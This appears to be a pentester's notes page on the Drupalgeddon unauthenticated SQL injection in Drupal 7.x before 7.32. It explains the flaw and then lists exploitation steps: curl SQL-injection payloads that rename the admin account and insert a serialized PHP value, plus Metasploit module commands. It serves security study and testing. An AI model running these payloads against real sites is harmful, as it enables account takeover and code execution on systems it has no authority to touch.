---
tags:
  - attack
  - web
date: 2023-09-1
---
- Critical unauthenticated SQLi.
- Affects `Drupal 7.x < 7.32`
# Vulnerability

- Affects Drupal's `Database Abstraction Layer` - in how form fields and arrays were sanitized in `db_query()` operations.
- Attacker inject malicious SQL into unsanitized form elements via crafted parameters:
	- `name[0;INSERT SQL HERE]=value`
- Access used to:
	- modify admin user password or name
	- inject PHP functions into Drupal's variable system (e.g. `drupal_eval`).
	- execute arbitrary PHP code via Drupal's callback mechanism.
# Exploitation Process

- Send POST request with malicious array key.
- Use SQLi to:
	- reset the `uid=1` (admin) user.
	- inject settings that trigger PHP evaluation.
- Achieve code execution or admin login.
# Exploitation

- Rest admin user's name via SQLi:
	- `curl -d "name[0;update users set name='hacked' where uid=1;#]=1&name[0]=test" http://target/?q=node&destination=node`
- Inject PHP execution into Drupal config:
	- `curl -d "name[0;INSERT INTO variable (name, value) VALUES ('shell', 'O:8:\"stdClass\":1:{s:4:\"test\";s:6:\"phpinfo\";}');#]=1" http://target/?q=node`
- Use [[Metasploit]]:
	- `use exploit/unix/webapp/drupal_drupalgeddon`
	- `set RHOSTS http://target`
	- `run`

